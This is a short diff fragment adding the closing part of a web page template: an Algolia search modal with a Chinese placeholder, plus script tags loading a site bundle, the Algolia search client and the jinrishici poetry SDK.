+        <input type="text" id="algolia-search-input" class="c-search-modal__input" placeholder="请输入关键词..." />
+        <div id="algolia-search-results" class="c-search-modal__results"></div>
+        <div id="algolia-pagination" class="c-search-modal__pagination"></div>
+        <hr class="c-search-modal__divider" />
+    </div>
+</div>
+
+<script src='https://static.dionysus.zip/static/js/app-IJHRYWUS.js' defer></script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/algoliasearch@4/dist/algoliasearch-lite.umd.js" defer></script>
+<script src="https://sdk.jinrishici.com/v2/browser/jinrishici.js" charset="utf-8" defer></script>
+</body>
+</html>
+
